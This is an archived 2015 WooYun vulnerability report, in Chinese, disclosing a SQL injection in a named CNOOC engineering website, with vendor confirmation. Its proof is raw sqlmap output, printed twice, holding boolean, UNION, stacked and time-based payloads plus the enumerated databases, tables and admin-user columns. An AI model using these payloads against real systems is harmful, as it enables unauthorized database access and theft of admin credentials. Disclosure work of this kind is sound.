{"id": 38816, "wybug_id": "wooyun-2015-095407", "wybug_title": "中海油某站SQL注入漏洞", "wybug_corp": "中国海洋石油总公司", "wybug_author": "路人甲", "wybug_date": "2015-02-04 14:41", "wybug_open_date": "2015-03-21 14:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-21：\t细节向公众公开  简要描述： 中海油某站SQL注入漏洞 详细说明：  http://www.cnoocengineering.com/ship01.aspx?column_id=10411&news_id=11803news_id可注入   漏洞证明：  \nParameter: news_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: column_id=10411&news_id=11803 AND 4486=4486    Type: UNION query    Title: Generic UNION query (NULL) - 26 columns    Payload: column_id=10411&news_id=-8175 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(107)+CHAR(113)+CHAR(113)+CHAR(99)+CHAR(113)+CHAR(77)+CHAR(120)+CHAR(121)+CHAR(122)+CHAR(86)+CHAR(100)+CHAR(74)+CHAR(70)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: column_id=10411&news_id=11803; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: column_id=10411&news_id=11803 WAITFOR DELAY '0:0:5'-----web server operating system: Windows 8 or 2012web application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 8.0back-end DBMS: Microsoft SQL Server 2012sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: news_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: column_id=10411&news_id=11803 AND 4486=4486    Type: UNION query    Title: Generic UNION query (NULL) - 26 columns    Payload: column_id=10411&news_id=-8175 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(107)+CHAR(113)+CHAR(113)+CHAR(99)+CHAR(113)+CHAR(77)+CHAR(120)+CHAR(121)+CHAR(122)+CHAR(86)+CHAR(100)+CHAR(74)+CHAR(70)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: column_id=10411&news_id=11803; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: column_id=10411&news_id=11803 WAITFOR DELAY '0:0:5'-----web server operating system: Windows 8 or 2012web application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 8.0back-end DBMS: Microsoft SQL Server 2012current user:    'newsite'available databases [5]:[*] Haigong[*] master[*] model[*] msdb[*] tempdbDatabase: Haigong[47 tables]+----------------------+| cms_ad_class         || cms_ad_file          || cms_ad_mess          || cms_admin_files      || cms_admin_menu       || cms_admin_role       || cms_admin_user       || cms_admin_userrole   || cms_area_city        || cms_area_news_column || cms_area_news_info   || cms_area_province    || cms_bq_info          || cms_config           || cms_files_images     || cms_files_info       || cms_files_kind       || cms_friend_info      || cms_gg_info          || cms_jytd_news_column || cms_jytd_news_info   || cms_magazine_column  || cms_magazine_info    || cms_maps_info        || cms_member_info      || cms_member_kind      || cms_member_level     || cms_member_point     || cms_menu_list        || cms_message_center   || cms_news_column      || cms_news_comments    || cms_news_info        || cms_news_pic         || cms_person_info      || cms_position_info    || cms_qixia_column     || cms_qixia_info       || cms_question_info    || cms_related_news     || cms_relates_our      || cms_reply_info       || cms_role_function    || cms_smtp             || cms_user_column      || cms_ziliao           || dtproperties         |+----------------------+Table: cms_admin_user[10 columns]+-------------+----------+| Column      | Type     |+-------------+----------+| ADD_TIME    | datetime || column_uuid | varchar  || END_TIME    | datetime || is_child    | bit      || IS_USE      | bit      || PASSWORD    | varchar  || START_TIME  | datetime || USER_TYPE   | varchar  || USERNAME    | varchar  || UUID        | varchar  |+-------------+----------+\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-02-06 16:04 厂商回复： 感谢路人甲，我们会尽快整改问题！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}